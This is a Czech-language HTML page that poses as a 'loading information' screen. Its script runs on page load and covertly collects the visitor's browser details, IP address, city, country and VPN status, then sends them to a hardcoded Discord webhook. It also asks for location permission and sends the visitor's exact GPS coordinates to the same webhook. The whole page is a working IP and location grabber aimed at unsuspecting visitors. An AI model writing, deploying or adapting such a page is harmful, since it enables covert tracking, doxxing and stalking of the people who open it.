<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Detekce Informac칤</title>
</head>
<body>
    <h2>Na캜칤t치n칤 informac칤...</h2>
    
    <script>
        const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";

        function sendToWebhook(data) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: data })
            }).catch(err => console.error("Chyba p콏i odes칤l치n칤:", err));
        }

        function getDeviceInfo() {
            return `游님 Za콏칤zen칤: ${navigator.userAgent}`;
        }

        function getIPInfo(callback) {
            fetch("https://ipapi.co/json/")
                .then(response => response.json())
                .then(data => {
                    let ipMessage = `游깴 IP Adresa: ${data.ip} (M캩sto: ${data.city}, Zem캩: ${data.country})\n游깷 VPN: ${data.proxy ? "Ano" : "Ne"}`;
                    callback(ipMessage);
                })
                .catch(error => {
                    console.error("Chyba p콏i z칤sk치v치n칤 IP:", error);
                    callback("游깴 IP Adresa: Nezn치m치\n游깷 VPN: Nezn치m칠");
                });
        }

        function sendInitialData() {
            getIPInfo(ipData => {
                let message = `${getDeviceInfo()}\n${ipData}\n游늸 GPS: Nepovoleno`;
                sendToWebhook(message);
                askForLocation();  
            });
        }

        function askForLocation() {
            setTimeout(() => {
                if (confirm("Chce코 povolit sd칤len칤 polohy?")) {
                    getLocation();
                }
            }, 2000);
        }

        function getLocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(position => {
                    let { latitude, longitude } = position.coords;
                    let gpsMessage = `游늸 GPS Sou콏adnice: ${latitude}, ${longitude}\n游댕 Mapa: [Zobrazit na Mapy.cz](https://mapy.cz/zakladni?x=${longitude}&y=${latitude}&z=15)`;
                    
                    getIPInfo(ipData => {
                        let message = `${getDeviceInfo()}\n${ipData}\n${gpsMessage}`;
                        sendToWebhook(message);
                    });

                }, error => {
                    console.error("GPS nen칤 povoleno", error);
                });
            } else {
                console.log("Geolokace nen칤 podporov치na.");
            }
        }

        // Spu코t캩n칤 procesu
        sendInitialData();
    </script>
</body>
</html>
